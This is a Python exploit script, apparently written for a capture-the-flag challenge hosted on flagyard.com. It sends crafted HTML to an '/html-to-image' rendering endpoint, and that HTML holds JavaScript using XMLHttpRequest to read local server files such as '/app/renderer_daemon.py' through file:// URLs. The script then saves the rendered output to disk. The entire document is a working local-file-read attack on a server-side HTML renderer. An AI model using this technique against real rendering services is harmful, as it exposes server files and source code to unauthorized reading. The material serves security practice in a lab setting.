import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=45)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/src_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes')
                return
            print(f'{name}: [{r.status_code}] {r.text[:120]}')
            return
        except Exception: time.sleep(2)

def xhr(path):
    return f'''<!doctype html><html><head><style>body{{font-family:monospace;font-size:15px;white-space:pre-wrap;word-break:break-all;padding:12px;line-height:1.35}}</style></head><body><div id=o>...</div><script>
var x=new XMLHttpRequest();try{{x.open("GET","file://{path}",false);x.send();document.getElementById("o").textContent=x.responseText||("EMPTY:"+x.status);}}catch(e){{document.getElementById("o").textContent="ERR:"+e;}}</script></body></html>'''

render(xhr('/bridge/render_port'), 'render_port')
time.sleep(1)
render(xhr('/app/renderer_daemon.py'), 'renderer_daemon')
